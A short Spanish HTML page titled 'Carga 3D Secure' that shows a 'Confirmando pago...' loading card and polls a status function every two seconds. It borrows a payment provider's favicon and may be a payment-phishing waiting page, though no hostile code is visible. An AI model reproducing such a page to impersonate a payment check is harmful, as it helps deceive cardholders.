<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carga 3D Secure</title>
    <link rel="icon" href="https://placetopay.dev/favicon.svg" type="image/vnd.microsoft.icon">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
    <script src="/js/jquery.min.js"></script>
    

    <script type="text/javascript" src="../../scripts/jquery-3.6.0.min.js"></script>
		<script src="../../scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="../../scripts/functions2.js"></script> 
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        .card {
            width: 300px;
            padding: 20px;
            border-radius: 10px;
            background-color: white;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .loading {
            text-align: center;
        }
        .loading img {
            width: 100px;
            height: 100px;
        }
        .message {
            text-align: center;
            margin-top: 20px;
            color: #E57600; /* Color del texto */
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="loading">
            <img src="/img/loading-orange.gif" alt="Cargando">
        </div>
        <div class="message">
            <p>Confirmando pago...</p>
            <p></p>
        </div>
    </div>


    <script language="javascript">
        $(document).ready(function() {
            setInterval(consultar_estado,2000);	
            console.log("Cargando")
        });
        </script>
</body>
</html>

